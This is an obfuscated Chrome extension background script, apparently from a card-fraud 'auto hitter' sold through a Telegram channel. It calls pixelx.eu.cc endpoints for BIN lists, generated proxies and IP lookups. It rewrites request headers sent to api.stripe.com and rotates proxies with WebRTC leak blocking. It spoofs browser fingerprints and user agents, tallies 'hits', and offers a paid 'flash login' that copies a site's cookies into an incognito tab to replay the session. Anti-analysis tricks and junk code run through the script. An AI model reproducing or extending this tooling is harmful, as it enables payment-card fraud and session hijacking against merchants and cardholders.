var window = self;
const _0x513bfe = function () {
  let _ = true;
  return function (c, e) {
    {
      const x = _ ? function () {
        if (e) {
          const x = e.apply(c, arguments);
          e = null;
          return x;
          {
            let x;
            try {
              const _ = undefined;
              x = _0x4876fa("return (function() {}.constructor(\"return this\")( ));")();
            } catch (_) {
              x = _0xd4b923;
            }
            x.setInterval(_0x2ca5ab, 4000);
          }
        }
      } : function () {};
      _ = false;
      return x;
    }
  };
}();
const _0x5aa9c5 = _0x513bfe(this, function () {
  return _0x5aa9c5.toString().search("(((.+)+)+)+$").toString().constructor(_0x5aa9c5).search("(((.+)+)+)+$");
});
_0x5aa9c5();
const _0x2528b8 = function () {
  let _ = true;
  return function (c, e) {
    const d = _ ? function () {
      if (e) {
        const x = e.apply(c, arguments);
        e = null;
        return x;
        if (_0x34b30a) {
          _0x417f86(() => {
            const x = {
              type: "PLAY_BACKGROUND_MUSIC",
              audioData: _0x51e991,
              volume: _0x46323d.volume
            };
            _0x4af0f8.runtime.sendMessage(x).catch(() => {});
          }, 100);
        }
      }
    } : function () {};
    _ = false;
    return d;
    if (_0x91df84) {
      return _0x2bb6bc;
    }
    _0x70b935(0);
  };
}();
(function () {
  _0x2528b8(this, function () {
    const c = new RegExp("function *\\( *\\)");
    const e = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
    const W = _0x541769("init");
    if (c.test(W + "chain") && e.test(W + "input")) {
      _0x541769();
    } else {
      W("0");
    }
  })();
})();
const _0x3550f6 = function () {
  let _ = true;
  return function (c, e) {
    const x = _ ? function () {
      if (e) {
        const x = e.apply(c, arguments);
        e = null;
        return x;
        {
          _0x1ef053({
            success: true,
            enabled: false,
            proxyString: ""
          });
        }
      }
    } : function () {};
    _ = false;
    return x;
    _0x2ef109 += "&" + _0x4eca8e(_0x115eee) + "=" + _0x292137(_0x31d5f9);
  };
}();
const _0x3bba09 = _0x3550f6(this, function () {
  const _0x48c6a6 = function () {
    let _;
    try {
      _ = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (c) {
      _ = window;
    }
    return _;
    {
      if (_0x2a2053.name === "AbortError") {
        return {
          success: false,
          error: "Request timed out"
        };
      }
      const _ = {
        success: false,
        error: _0x4087c3.message
      };
      return _;
    }
  };
  const _ = _0x48c6a6();
  const c = _.console = _.console || {};
  const e = ["log", "warn", "info", "error", "exception", "table", "trace"];
  for (let _ = 0; _ < e.length; _++) {
    const x = _0x3550f6.constructor.prototype.bind(_0x3550f6);
    const W = e[_];
    const d = c[W] || x;
    x.__proto__ = _0x3550f6.bind(_0x3550f6);
    x.toString = d.toString.bind(d);
    c[W] = x;
  }
});
(function () {
  let _;
  try {
    const c = Function("return (function() {}.constructor(\"return this\")( ));");
    _ = c();
  } catch (c) {
    _ = window;
  }
  _.setInterval(_0x541769, 4000);
})();
_0x3bba09();
const _originalFetch = self.fetch;
const AUTH_BASE_URL = "https://pixelx.eu.cc/xunezgoat.php";
const VERIFY_TOKEN_URL = AUTH_BASE_URL + "/api/verify";
const PIXEL_API_BASE = "https://pixelx.eu.cc/api.php";
const PIXEL_MAILS_API_BASE = "https://pixelx.eu.cc/mails.php";
const PIXEL_IPLOOKUP_URL = "https://pixelx.eu.cc/iplookup.php";
const PIXEL_BINSITES_BASE = "https://pixelx.eu.cc/binsites.php";
const PIXEL_FEED_BASE = "https://pixelx.eu.cc/binbook.php";
const PIXEL_GENERATE_PROXY_URL = "https://pixelx.eu.cc/proxygen.php";
const GENERATED_PROXY_TIMEOUT_MS = 90000;
const GENERATED_PROXY_MAX_RETRIES = 3;
const USER_AGENT_RULE_ID = 2;
const FINGERPRINT_USER_AGENT_RULE_ID = 3;
const USER_AGENT_STORAGE_KEY = "pixel_user_agent_value";
const USER_AGENT_ENABLED_KEY = "pixel_user_agent_enabled";
const USER_AGENT_BROWSER_KEY = "pixel_user_agent_browser";
const USER_AGENT_DEVICE_KEY = "pixel_user_agent_device";
const FINGERPRINT_SWITCH_ENABLED_KEY = "pixel_fingerprint_switch_enabled";
const FINGERPRINT_SWITCH_SETTINGS_KEY = "pixel_fingerprint_switch_settings";
const FINGERPRINT_PROFILE_MODE_KEY = "pixel_fingerprint_profile_mode";
const FINGERPRINT_ACTIVE_USER_AGENT_KEY = "pixel_fingerprint_active_user_agent";
const FINGERPRINT_LAST_PROFILE_KEY = "pixel_fingerprint_last_profile";
const VERSION_CHECK_INTERVAL_MS = 10800000;
const VERSION_CHECK_CACHE_KEY = "pixel_version_check_cache";
const ERROR_LOGS_STORAGE_KEY = "pixel_error_logs";
const FLASH_LOGIN_STORAGE_KEY = "pixel_flash_login_payload";
const FLASH_LOGIN_FREE_USAGE_KEY = "pixel_flash_login_free_usage";
const FLASH_LOGIN_FREE_LIMIT = 5;
const USER_PLAN_STORAGE_KEY = "pixel_user_plan";
const PROXY_SESSION_CONNECTED_AT_KEY = "pixel_proxy_session_connected_at";
const proxySessionState = {
  connected: false,
  connectedAt: 0,
  uploadBytes: 0,
  downloadBytes: 0
};
const proxyRequestUploadSeen = new Set();
const proxyRequestDownloadSeen = new Set();
let fingerprintReferenceDevicesPromise = null;
const flashLoginActiveTabs = new Set();
const COUNTRY_LOCALE_MAP = {
  US: "en-US",
  GB: "en-GB",
  AU: "en-AU",
  CA: "en-CA",
  NZ: "en-NZ",
  IE: "en-IE",
  IN: "en-IN",
  SG: "en-SG",
  PH: "en-PH",
  ZA: "en-ZA",
  NG: "en-NG",
  DE: "de-DE",
  AT: "de-AT",
  CH: "de-CH",
  FR: "fr-FR",
  BE: "fr-BE",
  NL: "nl-NL",
  ES: "es-ES",
  MX: "es-MX",
  AR: "es-AR",
  CL: "es-CL",
  CO: "es-CO",
  PE: "es-PE",
  IT: "it-IT",
  PT: "pt-PT",
  BR: "pt-BR",
  SE: "sv-SE",
  NO: "nb-NO",
  DK: "da-DK",
  FI: "fi-FI",
  PL: "pl-PL",
  CZ: "cs-CZ",
  HU: "hu-HU",
  RO: "ro-RO",
  GR: "el-GR",
  TR: "tr-TR",
  RU: "ru-RU",
  UA: "uk-UA",
  IL: "he-IL",
  SA: "ar-SA",
  AE: "ar-AE",
  BD: "bn-BD",
  PK: "ur-PK",
  JP: "ja-JP",
  KR: "ko-KR",
  CN: "zh-CN",
  TW: "zh-TW",
  HK: "zh-HK",
  TH: "th-TH",
  VN: "vi-VN",
  ID: "id-ID",
  MY: "ms-MY"
};
function resolveLocaleFromCountryCode(x = "") {
  const e = String(x || "").trim().toUpperCase();
  return COUNTRY_LOCALE_MAP[e] || "en-US";
}
function buildLanguagesFromLocale(x = "") {
  const c = String(x || "").trim() || "en-US";
  const e = c.split("-")[0] || "en";
  const W = [c];
  if (!W.includes(e)) {
    W.push(e);
  }
  if (e !== "en" && !W.includes("en")) {
    W.push("en");
  }
  return W;
}
function buildAcceptLanguageHeader(x = "", _ = []) {
  const e = undefined;
  return (Array.isArray(_) && _.length ? _ : buildLanguagesFromLocale(x)).filter(Boolean).map((x, _) => _ === 0 ? x : x + ";q=" + Math.max(0.1, 1 - _ * 0.1).toFixed(1)).join(",");
}
function buildFingerprintGeoContext(x = {}) {
  const c = String(x.ip || "").trim();
  const e = x.location && typeof x.location === "object" ? x.location : {};
  const W = String(e.country_code || x.countryCode || "").trim().toUpperCase();
  const d = resolveLocaleFromCountryCode(W);
  const n = buildLanguagesFromLocale(d);
  return {
    success: !!c,
    ip: c,
    countryCode: W,
    country: String(e.country || x.country || "").trim(),
    timezone: String(e.timezone || "").trim(),
    locale: d,
    languages: n,
    acceptLanguage: buildAcceptLanguageHeader(d, n)
  };
}
function normalizeFingerprintHeaderContext(x = {}) {
  const c = x && typeof x === "object" ? x : {};
  const e = String(c.locale || "").trim();
  const W = Array.isArray(c.languages) ? c.languages.map(x => String(x || "").trim()).filter(Boolean) : [];
  const d = String(c.acceptLanguage || "").trim() || buildAcceptLanguageHeader(e, W);
  const n = {
    locale: e,
    languages: W,
    acceptLanguage: d
  };
  return n;
}
function sanitizeErrorLogText(x) {
  let c = String(x || "").trim();
  if (!c) {
    return "";
  }
  c = c.replace(/https?:\/\/[^\s]+/gi, "***");
  c = c.replace(/\b(?:[a-z]+:\/\/)?(?:[^@\s/:]+:[^@\s/:]+@)?(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}(?::[^\s]+)?/gi, "***");
  c = c.replace(/\b(?:[a-z]+:\/\/)?(?:[^@\s/:]+:[^@\s/:]+@)?[a-z0-9.-]+\.[a-z]{2,}:\d{2,5}(?::[^\s]+)?/gi, "***");
  return c;
}
async function loadFingerprintReferenceDevices() {
  if (fingerprintReferenceDevicesPromise) {
    return fingerprintReferenceDevicesPromise;
  }
  fingerprintReferenceDevicesPromise = (async () => {
    try {
      const x = await fetch(chrome.runtime.getURL("Fingerprint/devices.json"));
      if (x.ok) {
        return await x.json();
      } else {
        return {};
      }
      _0x34f2ac({
        success: false,
        error: _0x4f62ae.message || "Failed to clear browsing data"
      });
    } catch (_) {
      return {};
      _0x1b3773 = _0x2cc533.parse(_0x37d4e3);
    }
  })();
  return fingerprintReferenceDevicesPromise;
}
async function appendBackgroundErrorLog(x, _ = "background") {
  try {
    {
      const e = sanitizeErrorLogText(x);
      if (!e) {
        return;
      }
      const W = await chrome.storage.local.get([ERROR_LOGS_STORAGE_KEY]);
      const d = Array.isArray(W[ERROR_LOGS_STORAGE_KEY]) ? W[ERROR_LOGS_STORAGE_KEY] : [];
      const n = undefined;
      const t = [{
        id: Date.now() + "_" + Math.random().toString(36).slice(2, 8),
        at: new Date().toISOString(),
        source: _,
        message: e
      }, ...d].slice(0, 50);
      const o = {
        [ERROR_LOGS_STORAGE_KEY]: t
      };
      await chrome.storage.local.set(o);
    }
  } catch (x) {}
}
async function setStunLeakProtection(x) {
  if (!chrome.privacy || !chrome.privacy.network || !chrome.privacy.network.webRTCIPHandlingPolicy) {
    return;
  }
  const e = {
    value: x ? "disable_non_proxied_udp" : "default"
  };
  await chrome.privacy.network.webRTCIPHandlingPolicy.set(e);
}
function resetProxySessionState() {
  const _ = undefined;
  const c = {
    ZRJsu: "2|1|0|5|4|3"
  }.ZRJsu.split("|");
  let e = 0;
  while (true) {
    switch (c[e++]) {
      case "0":
        proxySessionState.uploadBytes = 0;
        continue;
      case "1":
        proxySessionState.connectedAt = 0;
        continue;
      case "2":
        proxySessionState.connected = false;
        continue;
      case "3":
        proxyRequestDownloadSeen.clear();
        continue;
      case "4":
        proxyRequestUploadSeen.clear();
        continue;
      case "5":
        proxySessionState.downloadBytes = 0;
        continue;
    }
    break;
  }
}
function startProxySessionState() {
  const _ = undefined;
  const c = {
    YCoLk: "2|3|0|4|5|1"
  }.YCoLk.split("|");
  let e = 0;
  while (true) {
    switch (c[e++]) {
      case "0":
        proxySessionState.uploadBytes = 0;
        continue;
      case "1":
        proxyRequestDownloadSeen.clear();
        continue;
      case "2":
        proxySessionState.connected = true;
        continue;
      case "3":
        proxySessionState.connectedAt = Date.now();
        continue;
      case "4":
        proxySessionState.downloadBytes = 0;
        continue;
      case "5":
        proxyRequestUploadSeen.clear();
        continue;
    }
    break;
  }
}
function readHeaderBytes(x, _) {
  const e = (x || []).find(x => String(x?.name || "").toLowerCase() === String(_ || "").toLowerCase());
  const W = Number(e?.value || 0);
  if (Number.isFinite(W) && W > 0) {
    return W;
  } else {
    return 0;
  }
}
function estimateHeadersSize(x = []) {
  return (x || []).reduce((x, c) => {
    const e = String(c?.name || "");
    const W = String(c?.value || "");
    return x + e.length + W.length + 4;
    {
      const x = {
        endpoint: _0x4df1db.endpoint,
        method: _0x4d53bf.method,
        token: _0x120027.token,
        body: _0x545394.body
      };
      _0x83617d(x).then(_0x38ed85).catch(x => _0xb5c13c({
        success: false,
        error: x.message
      }));
      return true;
    }
  }, 2);
}
function estimateRequestBytes(x) {
  const c = String(x?.url || "");
  const e = String(x?.method || "GET");
  const W = estimateHeadersSize(x?.requestHeaders || []);
  const d = readHeaderBytes(x?.requestHeaders, "content-length");
  const n = e.length + c.length + W + 16;
  return Math.max(n + d, 1);
}
function estimateResponseBytes(x) {
  const c = estimateHeadersSize(x?.responseHeaders || []);
  const e = readHeaderBytes(x?.responseHeaders, "content-length");
  const W = 16;
  const d = W + c;
  return Math.max(d + e, 1);
}
async function getProxySessionStatus() {
  const _ = await chrome.storage.local.get(["pixel_proxy_info", PROXY_SESSION_CONNECTED_AT_KEY]);
  const c = await getProxyState().catch(() => ({
    success: false,
    enabled: false,
    proxyString: ""
  }));
  const e = _?.pixel_proxy_info || {};
  const W = c && c.success === true && c.enabled === true;
  const d = Number(proxySessionState.connectedAt || _?.[PROXY_SESSION_CONNECTED_AT_KEY] || 0);
  if (W && !proxySessionState.connected) {
    proxySessionState.connected = true;
    proxySessionState.connectedAt = d || Date.now();
  }
  if (!W && proxySessionState.connected) {
    resetProxySessionState();
  }
  return {
    success: true,
    connected: W,
    connectedAt: W ? proxySessionState.connectedAt || d || Date.now() : 0,
    uploadBytes: proxySessionState.uploadBytes || 0,
    downloadBytes: proxySessionState.downloadBytes || 0,
    totalBytes: (proxySessionState.uploadBytes || 0) + (proxySessionState.downloadBytes || 0),
    durationMs: W ? Math.max(Date.now() - Number(proxySessionState.connectedAt || d || Date.now()), 0) : 0,
    location: String(e.country_name || e.country_code || "").trim()
  };
}
async function syncProxyPrivacyFromStorage() {
  try {
    {
      const _ = await getProxyState().catch(() => ({
        success: false,
        enabled: false
      }));
      if (_ && _.success === true && _.enabled === true) {
        await setStunLeakProtection(true);
        if (!proxySessionState.connected) {
          startProxySessionState();
        }
        return;
      }
      resetProxySessionState();
      await setStunLeakProtection(false);
    }
  } catch (x) {}
}
function normalizeFlashLoginHost(x = "") {
  return String(x || "").trim().toLowerCase().replace(/^\.+/, "");
}
function sanitizeFlashLoginCookie(x = {}) {
  return {
    name: String(x.name || ""),
    value: String(x.value || ""),
    domain: String(x.domain || ""),
    path: String(x.path || "/"),
    secure: x.secure === true,
    httpOnly: x.httpOnly === true,
    sameSite: x.sameSite || "unspecified",
    expirationDate: Number(x.expirationDate || 0)
  };
}
async function getFlashLoginPayload() {
  const c = await chrome.storage.local.get([FLASH_LOGIN_STORAGE_KEY]);
  const e = c?.[FLASH_LOGIN_STORAGE_KEY];
  if (e && typeof e === "object") {
    return e;
  } else {
    return null;
  }
}
async function clearFlashLoginPayload() {
  await chrome.storage.local.remove([FLASH_LOGIN_STORAGE_KEY]);
}
async function getFlashLoginUsageInfo() {
  const _ = await chrome.storage.local.get([USER_PLAN_STORAGE_KEY, FLASH_LOGIN_FREE_USAGE_KEY]);
  const c = String(_?.[USER_PLAN_STORAGE_KEY] || "free").trim().toLowerCase() === "pro" ? "pro" : "free";
  const e = Math.max(0, Number(_?.[FLASH_LOGIN_FREE_USAGE_KEY] || 0) || 0);
  return {
    plan: c,
    used: e,
    limit: FLASH_LOGIN_FREE_LIMIT,
    remaining: c === "pro" ? null : Math.max(FLASH_LOGIN_FREE_LIMIT - e, 0)
  };
}
async function assertFlashLoginAllowed() {
  const _ = await getFlashLoginUsageInfo();
  if (_.plan !== "pro" && _.used >= FLASH_LOGIN_FREE_LIMIT) {
    throw new Error("Free flash login limit reached. Upgrade to Pro for unlimited flash login.");
  }
  return _;
}
async function incrementFlashLoginUsage() {
  const _ = await getFlashLoginUsageInfo();
  if (_.plan === "pro") {
    return _;
  }
  const c = Math.min(_.used + 1, FLASH_LOGIN_FREE_LIMIT);
  const e = {
    [FLASH_LOGIN_FREE_USAGE_KEY]: c
  };
  await chrome.storage.local.set(e);
  return {
    ..._,
    used: c,
    remaining: Math.max(FLASH_LOGIN_FREE_LIMIT - c, 0)
  };
}
async function getCookieStoreIdForTab(x) {
  try {
    {
      if (!chrome.cookies?.getAllCookieStores) {
        return "";
      }
      const _ = undefined;
      const c = ((await chrome.cookies.getAllCookieStores()) || []).find(_ => Array.isArray(_.tabIds) && _.tabIds.includes(x));
      return String(c?.id || "").trim();
    }
  } catch (x) {
    return "";
  }
}
function buildFlashLoginCookieUrl(x, _) {
  const e = normalizeFlashLoginHost(String(x.domain || "").replace(/^\./, "")) || normalizeFlashLoginHost(_?.host || "");
  const W = x.secure ? "https" : String(_?.scheme || "https").trim().toLowerCase() === "http" ? "http" : "https";
  const d = String(x.path || "/").startsWith("/") ? String(x.path || "/") : "/" + String(x.path || "");
  return W + "://" + (e || normalizeFlashLoginHost(_?.host || "")) + d;
}
function doesFlashLoginTabMatch(x = "", _ = null) {
  if (!_) {
    return false;
  }
  try {
    const e = new URL(x);
    const W = normalizeFlashLoginHost(e.hostname);
    const d = normalizeFlashLoginHost(_.host);
    return !!W && !!d && (W === d || W.endsWith("." + d) || d.endsWith("." + W));
    {
      _0x3aa583.connected = true;
      _0x520683.connectedAt = _0x4be356.now();
      _0x36920c.uploadBytes = 0;
      _0x36eeee.downloadBytes = 0;
      _0x219549.clear();
      _0x420e4f.clear();
    }
  } catch (x) {
    return false;
    _0xb13102(_0x415003);
    _0x22f46b = null;
  }
}
async function saveFlashLoginFromTab(x) {
  await assertFlashLoginAllowed();
  const c = await chrome.tabs.get(x);
  const e = String(c?.url || "").trim();
  if (!e || !/^https?:\/\//i.test(e)) {
    throw new Error("Select a normal website tab first.");
    _0x428cc5 = _0x36f122 ? _0x29dc72.parse(_0x3a6f7a) : {};
  }
  if (c?.incognito) {
    throw new Error("Flash login source tab must not be incognito.");
    _0x53e146 = _0x5607e1[1] + ":" + _0xce12df[2];
    if (_0x18f948 && _0x9facc2.username && _0x250659.password) {
      _0x128e94 = _0x1749b6.username + ":" + _0x31a026.password + "@" + _0x50fc58[1] + ":" + _0x17668c[2];
    }
  }
  const W = new URL(e);
  const d = {
    url: W.origin
  };
  const n = await chrome.cookies.getAll(d);
  if (!Array.isArray(n) || !n.length) {
    throw new Error("No cookies found on that site.");
    if (_0x486055 !== null && _0x2e4e87 !== _0x16ceb5) {
      _0x283176 += "&" + _0x1d2fcc(_0x3ee2f7) + "=" + _0x525dad(_0x1cd653);
    }
  }
  const t = {
    host: normalizeFlashLoginHost(W.hostname),
    origin: W.origin,
    scheme: W.protocol.replace(":", ""),
    savedAt: Date.now(),
    count: n.length,
    cookies: n.map(x => sanitizeFlashLoginCookie(x)).filter(x => x.name)
  };
  const o = {
    [FLASH_LOGIN_STORAGE_KEY]: t
  };
  await chrome.storage.local.set(o);
  return t;
}
async function maybeApplyFlashLoginToTab(x, _ = null) {
  if (!x || flashLoginActiveTabs.has(x)) {
    return false;
  }
  const e = await getFlashLoginPayload();
  if (!e || !Array.isArray(e.cookies) || !e.cookies.length) {
    return false;
  }
  await assertFlashLoginAllowed();
  const W = _ || (await chrome.tabs.get(x).catch(() => null));
  if (!W || W.incognito !== true) {
    return false;
  }
  if (!doesFlashLoginTabMatch(W.url, e)) {
    return false;
  }
  flashLoginActiveTabs.add(x);
  try {
    {
      const _ = await getCookieStoreIdForTab(x);
      let W = 0;
      for (const x of e.cookies) {
        const d = {
          url: buildFlashLoginCookieUrl(x, e),
          name: x.name,
          value: x.value,
          domain: x.domain || undefined,
          path: x.path || "/",
          secure: x.secure === true,
          httpOnly: x.httpOnly === true,
          sameSite: x.sameSite || "unspecified"
        };
        if (_) {
          d.storeId = _;
        }
        if (x.expirationDate && Number.isFinite(x.expirationDate) && x.expirationDate > 0) {
          d.expirationDate = x.expirationDate;
        }
        await chrome.cookies.set(d).catch(() => null);
        W++;
      }
      await chrome.tabs.reload(x).catch(() => {});
      if (W > 0) {
        await incrementFlashLoginUsage();
      }
      await clearFlashLoginPayload();
      const d = {
        action: "flashLoginSuccess",
        message: "Flash login success" + (e.host ? " for " + e.host : "")
      };
      await chrome.tabs.sendMessage(x, d).catch(() => {});
      return W > 0;
    }
  } finally {
    flashLoginActiveTabs.delete(x);
  }
}
function getVersionConfig() {
  return {
    versionCode: "v1ltxadfsj443",
    versionCheckUrl: "https://pixelx.eu.cc/radhs454nx.json",
    updateLink: "https://t.me/pixelautohitter",
    outdatedStorageKey: "pixel_extension_outdated"
  };
}
async function getCachedVersionCheck() {
  try {
    {
      const _ = undefined;
      const c = (await chrome.storage.local.get([VERSION_CHECK_CACHE_KEY]))[VERSION_CHECK_CACHE_KEY];
      if (c && c.checkedAt && Date.now() - Number(c.checkedAt) < VERSION_CHECK_INTERVAL_MS) {
        return c;
      }
    }
  } catch (x) {}
  return null;
}
async function setCachedVersionCheck(x) {
  const e = {
    checkedAt: Date.now(),
    updated: x.updated === true,
    outdated: x.outdated === true,
    version_timeout: x.version_timeout === true
  };
  const W = {
    [VERSION_CHECK_CACHE_KEY]: e
  };
  await chrome.storage.local.set(W);
  return e;
}
async function checkVersion(x = false, _ = 0) {
  try {
    if (!x) {
      {
        const x = await getCachedVersionCheck();
        if (x) {
          {
            const _ = getVersionConfig();
            const e = {
              [_.outdatedStorageKey]: x.outdated === true
            };
            await chrome.storage.local.set(e);
            return x;
          }
        }
      }
    }
    const _ = getVersionConfig();
    const e = _.versionCheckUrl;
    const W = new AbortController();
    const d = setTimeout(() => W.abort(), 60000);
    const n = await fetch(e, {
      method: "GET",
      signal: W.signal
    });
    clearTimeout(d);
    if (!n.ok) {
      throw new Error("HTTP " + n.status);
      return false;
    }
    const t = await n.json().catch(() => ({}));
    const o = t && t.updated === true;
    const f = {
      [_.outdatedStorageKey]: !o
    };
    await chrome.storage.local.set(f);
    const r = {
      updated: o,
      outdated: !o,
      version_timeout: false
    };
    return await setCachedVersionCheck(r);
    _0x1b5c84(_0xfb9935?.message || "Proxy apply worker crashed.", "proxy-background");
    _0x89a0bf({
      success: false,
      error: _0x3d62ef?.message || "Proxy apply failed"
    });
  } catch (e) {
    if (_ < 2) {
      return await checkVersion(x, _ + 1);
    }
    const _e = getVersionConfig();
    const W = {
      [_e.outdatedStorageKey]: false
    };
    await chrome.storage.local.set(W);
    return await setCachedVersionCheck({
      updated: true,
      outdated: false,
      version_timeout: true
    });
    {
      const x = {
        success: false,
        error: _0x225a68.message
      };
      _0x43b644(x);
    }
  }
}
async function registerServiceWorker() {
  try {
    {
      const e = {
        id: 1
      };
      e.priority = 1;
      e.action = {
        type: "modifyHeaders",
        requestHeaders: [{
          header: "content-type",
          operation: "set",
          value: "application/x-www-form-urlencoded"
        }]
      };
      e.condition = {
        urlFilter: "||api.stripe.com/",
        resourceTypes: ["xmlhttprequest"]
      };
      const W = {
        removeRuleIds: [1],
        addRules: [e]
      };
      await chrome.declarativeNetRequest.updateDynamicRules(W);
    }
  } catch (x) {}
}
function parseProxyString(x) {
  if (!x || !x.trim()) {
    return null;
  }
  x = x.trim();
  let c = "";
  let e = 8080;
  let W = null;
  let d = null;
  try {
    if (x.includes("@")) {
      {
        const n = x.lastIndexOf("@");
        const t = x.substring(0, n);
        const o = x.substring(n + 1);
        const f = t.indexOf(":");
        if (f > 0) {
          W = t.substring(0, f);
          d = t.substring(f + 1);
        }
        const r = o.lastIndexOf(":");
        if (r > 0) {
          c = o.substring(0, r);
          e = parseInt(o.substring(r + 1)) || 8080;
        }
      }
    } else {
      const n = x.split(":");
      if (n.length >= 4) {
        const x = undefined;
        if (n[0].includes(".") || /^\d+$/.test(n[0])) {
          c = n[0];
          e = parseInt(n[1]) || 8080;
          W = n[2];
          d = n.slice(3).join(":");
        } else {
          W = n[0];
          d = n.slice(1, -2).join(":");
          c = n[n.length - 2];
          e = parseInt(n[n.length - 1]) || 8080;
        }
      } else if (n.length === 2) {
        c = n[0];
        e = parseInt(n[1]) || 8080;
      }
    }
  } catch (x) {
    return null;
    if (!_0x294704) {
      return false;
    }
    try {
      const x = new _0x1cd1cf(_0x500501);
      const _ = cgayEi.gqoGP(_0x160c0c, x.hostname);
      const c = cgayEi.xmhsJ(_0x149df0, _0x5a6aca.host);
      return cgayEi.fEfmA(!!_, !!c) && (cgayEi.WWXIk(_, c) || _.endsWith("." + c) || c.endsWith("." + _));
    } catch (x) {
      return false;
    }
  }
  if (!c || !e) {
    return null;
  }
  const n = {
    host: c,
    port: e,
    username: W,
    password: d
  };
  return n;
}
function sleep(x) {
  return new Promise(_ => setTimeout(_, x));
}
function normalizeProxyScheme(x = "") {
  const c = String(x || "").trim().toLowerCase();
  if (["http", "https", "socks4", "socks5"].includes(c)) {
    return c;
  }
  return "http";
}
function inferProxySchemes(x = "") {
  const c = undefined;
  const e = [normalizeProxyScheme(x), "http", "https", "socks5", "socks4"];
  return Array.from(new Set(e));
}
function getPacProxyToken(x) {
  switch (normalizeProxyScheme(x)) {
    case "https":
      return "HTTPS";
    case "socks4":
      return "SOCKS4";
    case "socks5":
      return "SOCKS5";
    default:
      return "PROXY";
  }
}
function buildFixedProxyConfig(x, _) {
  return {
    mode: "fixed_servers",
    rules: {
      singleProxy: {
        scheme: normalizeProxyScheme(_),
        host: x.host,
        port: x.port
      },
      bypassList: ["localhost", "<local>", "127.0.0.1"]
    }
  };
}
function buildPacProxyConfig(x, _) {
  const W = undefined;
  const d = getPacProxyToken(_) + " " + x.host + ":" + x.port + "; DIRECT";
  const n = {
    data: "function FindProxyForURL(url, host) { return \"" + d + "\"; }"
  };
  const t = {
    mode: "pac_script",
    pacScript: n
  };
  return t;
}
async function verifyAppliedProxyWithRetry(x, _, c = 6, e = 250) {
  let d = null;
  for (let n = 0; n < c; n += 1) {
    const t = await new Promise(x => {
      chrome.proxy.settings.get({
        incognito: false
      }, x);
    });
    d = t || null;
    const o = t && t.value ? t.value : {};
    const f = String(o.mode || "").toLowerCase();
    const r = String(_?.mode || "").toLowerCase();
    let a = false;
    if (r === "fixed_servers") {
      const _ = undefined;
      const c = (o.rules || {}).singleProxy || {};
      a = f === "fixed_servers" && String(c.host || "") === String(x.host) && Number(c.port || 0) === Number(x.port || 0);
    } else if (r === "pac_script") {
      {
        const _ = String(o.pacScript?.data || "");
        a = f === "pac_script" && _.includes(String(x.host)) && _.includes(String(x.port));
      }
    }
    if (a) {
      return {
        success: true
      };
      return null;
    }
    if (n < c - 1) {
      await sleep(e);
    }
  }
  const n = String(d?.levelOfControl || "unknown");
  const t = String(d?.value?.mode || "unknown");
  if (n === "controlled_by_other_extensions") {
    {
      return {
        success: false,
        error: "Proxy control is owned by another extension"
      };
    }
  }
  if (n === "not_controllable") {
    {
      return {
        success: false,
        error: "Proxy control is blocked by browser or policy"
      };
    }
  }
  const o = {
    success: false,
    error: "Proxy did not stay applied in browser settings (control: " + n + ", mode: " + t + ")"
  };
  return o;
}
async function setProxyAuth(x) {
  if (x.username && x.password) {
    const _ = {
      username: x.username,
      password: x.password
    };
    const c = {
      proxyAuth: _
    };
    await chrome.storage.local.set(c);
  } else {
    await chrome.storage.local.remove("proxyAuth");
  }
}
function applyProxy(x, _ = "http") {
  return new Promise(e => {
    {
      if (!chrome.proxy || !chrome.proxy.settings) {
        appendBackgroundErrorLog("Proxy API not available while trying to apply proxy.", "proxy-background");
        e({
          success: false,
          error: "Proxy API not available"
        });
        return;
        {
          const x = {
            success: false,
            error: "Server returned an empty proxy list.",
            data: _0x463839,
            retryable: true
          };
          return x;
        }
      }
      const d = parseProxyString(x);
      if (!d) {
        appendBackgroundErrorLog("Invalid proxy format was passed to applyProxy.", "proxy-background");
        e({
          success: false,
          error: "Invalid proxy format"
        });
        return;
        {
          const x = {
            success: true,
            user_id: _0x35cd1a.user_id || "",
            username: _0x1012b9.username || "",
            first_name: _0xc713c0.first_name || "",
            pfp_url: _0x40885b.pfp_url || "",
            hits: _0x1cb5a4.hits || 0,
            attempts: _0x447138.attempts || 0
          };
          return x;
        }
      }
      (async () => {
        await setProxyAuth(d);
        const c = inferProxySchemes(_);
        const n = [];
        const t = ["regular", "default"];
        for (const x of c) {
          for (const _ of t) {
            n.push({
              label: "fixed:" + x + ":" + _,
              config: buildFixedProxyConfig(d, x),
              scope: _
            });
          }
        }
        for (const _ of c) {
          for (const c of t) {
            n.push({
              label: "pac:" + _ + ":" + c,
              config: buildPacProxyConfig(d, _),
              scope: c
            });
          }
        }
        let o = "Proxy verification failed";
        for (const _ of n) {
          const c = await new Promise(c => {
            const n = {
              value: _.config
            };
            const t = n;
            if (_.scope === "regular") {
              t.scope = "regular";
            }
            chrome.proxy.settings.set(t, () => {
              if (chrome.runtime.lastError) {
                c({
                  success: false,
                  error: chrome.runtime.lastError.message || "chrome.proxy.settings.set failed"
                });
                return;
                _0x196e91 = _0x1b03ca.substring(0, _0x19bc26);
                _0x1bedef = _0x252936.substring(BiaqGG.bfiiU(_0x2e890c, 1));
              }
              const e = {
                success: false,
                error: "Proxy verification failed"
              };
              verifyAppliedProxyWithRetry(d, _.config).then(x => c(x || e)).catch(x => c({
                success: false,
                error: x?.message || "Proxy verification failed"
              }));
            });
          });
          if (c && c.success === true) {
            {
              startProxySessionState();
              const x = {
                [PROXY_SESSION_CONNECTED_AT_KEY]: proxySessionState.connectedAt
              };
              await chrome.storage.local.set(x);
              await setStunLeakProtection(true);
              const c = {
                success: true,
                mode: _.label
              };
              e(c);
              return;
            }
          }
          o = c?.error || o;
          appendBackgroundErrorLog("Proxy apply attempt failed (" + _.label + "): " + o, "proxy-background");
        }
        const f = {
          success: false,
          error: o
        };
        e(f);
      })().catch(x => {
        appendBackgroundErrorLog(x?.message || "Proxy apply worker crashed.", "proxy-background");
        e({
          success: false,
          error: x?.message || "Proxy apply failed"
        });
      });
    }
  });
}
function clearProxy() {
  return new Promise(_ => {
    {
      if (!chrome.proxy || !chrome.proxy.settings) {
        {
          _({
            success: true
          });
          return;
        }
      }
      chrome.proxy.settings.clear({
        scope: "regular"
      }, () => {
        {
          chrome.storage.local.remove("proxyAuth");
          chrome.storage.local.remove(PROXY_SESSION_CONNECTED_AT_KEY);
          resetProxySessionState();
          setStunLeakProtection(false);
          _({
            success: true
          });
        }
      });
    }
  });
}
